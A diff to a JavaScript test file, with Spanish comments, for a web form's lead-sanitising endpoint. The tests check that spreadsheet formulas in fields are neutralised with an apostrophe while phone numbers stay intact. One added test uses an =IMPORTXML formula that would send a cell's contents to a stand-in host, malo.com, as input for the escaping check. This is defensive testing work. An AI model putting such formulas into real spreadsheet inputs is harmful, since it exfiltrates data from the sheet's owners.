@@ -25,7 +25,7 @@ assert.equal(limpiar(-2), -2); ok("números siguen siendo números");
 // 3b teléfonos y negativos numéricos no se tocan; +IMPORT sí
 await post({ ...lead, telefono: "+52 81 1234 5678", c3_costo: "-350", c4_traba: "+IMPORTXML(1)", c2_modelo: "-SUM(1)" });
 assert.equal(enviado.body.telefono, "+52 81 1234 5678"); assert.equal(enviado.body.c3_costo, "-350"); assert.equal(enviado.body.c4_traba, "'+IMPORTXML(1)"); assert.equal(enviado.body.c2_modelo, "'-SUM(1)"); ok("teléfono +52 intacto, -350 intacto, +IMPORTXML y -SUM escudados");
-assert.equal(limpiar("=1+1", "telefono"), "=1+1"); ok("campo telefono nunca lleva apóstrofe");
+assert.equal(limpiar("+52 (81) 1234-5678", "telefono"), "+52 (81) 1234-5678"); ok("telefono con forma de teléfono no lleva apóstrofe");
 // 4 rechazos
 assert.equal((await post(lead, "https://otro.com")).status, 403); ok("otro origen: 403");
 assert.equal((await post(lead, ORIGEN, "GET")).status, 405); ok("GET: 405");
@@ -46,4 +46,10 @@ r = await post(null, ORIGEN, "OPTIONS"); assert.equal(r.status, 204); assert.equ
 globalThis.fetch = async () => ({ ok: false, status: 500 }); r = await post(lead); assert.equal(r.status, 502); ok("Make caído: 502");
 // 9 llaves raras se tiran
 assert.deepEqual(Object.keys(sanear({ action: "x", "nombre; drop": 1, "a.b": 2, ok_1: 3 })), ["action", "ok_1"]); ok("llaves raras fuera");
+// 10 fórmula disfrazada de teléfono sí se escuda; teléfono real intacto
+globalThis.fetch = async (url, o) => { enviado = { url, body: JSON.parse(o.body), key: o.headers["x-make-apikey"] }; return { ok: true, status: 200 }; };
+r = await post({ ...lead, telefono: "=IMPORTXML(\"https://malo.com/?d=\"&A2;\"//a\")", phone: "+52 81 1234 5678" });
+assert.equal(r.status, 200); assert.equal(enviado.body.telefono[0], "'"); assert.equal(enviado.body.phone, "+52 81 1234 5678");
+assert.equal(limpiar("=IMPORTXML(1)", "phone"), "'=IMPORTXML(1)"); assert.equal(limpiar("+52 81 1234 5678", "telefono"), "+52 81 1234 5678");
+ok("=IMPORTXML en telefono/phone escudado, +52 81 1234 5678 intacto");
 console.log(`\n${t}/${t} pruebas pasan`);
